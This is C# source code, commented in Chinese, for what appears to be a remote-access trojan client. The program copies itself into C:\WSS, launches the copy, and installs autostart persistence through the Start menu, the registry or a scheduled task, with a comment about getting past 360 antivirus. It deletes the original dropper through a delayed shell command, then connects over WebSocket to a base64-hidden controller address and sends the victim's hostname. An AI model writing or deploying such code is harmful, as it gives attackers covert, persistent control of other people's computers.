using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WebSocketSharp;
using System.Threading;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;
using TaskScheduler;

namespace websocket
{
    class Example
    {
        public static bool IsProcessExist(String proName)
        {
            foreach (System.Diagnostics.Process thisproc in System.Diagnostics.Process.GetProcessesByName(proName))
            {
                if (thisproc.ProcessName.ToLower().Trim() == proName.ToLower().Trim())
                {
                    return true;
                }
            }
            return false;
        }

        static void Main(string[] args)
        {
            string RootPath = @"C:\WSS\";//要释放的路径
            string ServiceName = "WSService";//要生成的文件名
            int startupCode = 2;//0:开始菜单启动 1:注册表启动 2:计划任务启动 [会被360拦截导致自启动失效 不过仍然会上线]
            string ip = "MTI3LjAuMC4x";//BASE64加密服务端IP

            if (!Directory.Exists(RootPath))//如果不存在就创建
            {
                Directory.CreateDirectory(RootPath);
            }

            if (!IsProcessExist(ServiceName))
            {
                string path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                string destinationPath = RootPath + ServiceName + ".exe";
                //如果不存在就生成
                if (!System.IO.File.Exists(destinationPath))
                {
                    //拷贝到特定目录
                    FileInfo fi = new FileInfo(path);
                    if (!fi.Exists)
                    {
                        fi.CreateText();
                    }
                    fi.CopyTo(destinationPath);
                }
                //记录生成器路径
                FileStream fs1 = new FileStream(RootPath + "path.ini", FileMode.Create, FileAccess.Write);
                StreamWriter sw1 = new StreamWriter(fs1);
                sw1.WriteLine(path);
                sw1.Close();
                fs1.Close();
                //运行目标
                MyWindowsCmd myWindowsCmd = new MyWindowsCmd();
                myWindowsCmd.StartCmd();
                myWindowsCmd.RunCmd(destinationPath);
                myWindowsCmd.WaitForExit();
                myWindowsCmd.StopCmd();
                //设定目录启动项
                StartupWay startupWay = new StartupWay();
                startupWay.doStartUpWay(startupCode, RootPath, ServiceName);
            }
            else
            {
                //删除生成器
                bool fistDel = false;
                if (File.Exists(RootPath + "path.ini"))
                {
                    fistDel = true;
                }
                if (fistDel)
                {
                    string path = File.ReadAllText(RootPath + "path.ini", Encoding.Default);
                    string delCreate = "del " + path;
                    string delIni = "del " + RootPath + "path.ini";
                    MyWindowsCmd myWindowsCmd = new MyWindowsCmd();
                    myWindowsCmd.StartCmd();
                    myWindowsCmd.RunCmd("ping -n 5 127.0.0.1>nul & " + delIni + " & " + delCreate);//延时五秒执行
                    myWindowsCmd.WaitForExit();
                    myWindowsCmd.StopCmd();
                }
                
                Base64Tools base64Tools = new Base64Tools();
                string url = "ws://" + base64Tools.base64decode(ip) + ":7272";

                WebSocketService wss = new BuissnesServiceImpl();
                WebSocketBase wb = new WebSocketBase(url, wss);
                wb.start();

                wb.send("{\"type\":\"login\",\"client_name\":\"" + System.Net.Dns.GetHostName() + "-" + "\"}");

                //发生断开重连时，需要重新订阅
                while (true)
                {
                    if (wb.isReconnect())
                    {
                        wb.send("{\"type\":\"login\",\"client_name\":\"" + System.Net.Dns.GetHostName() + "-" + "\"}");
                    }
                    Thread.Sleep(1000);
                }
            }
        }



    }

}
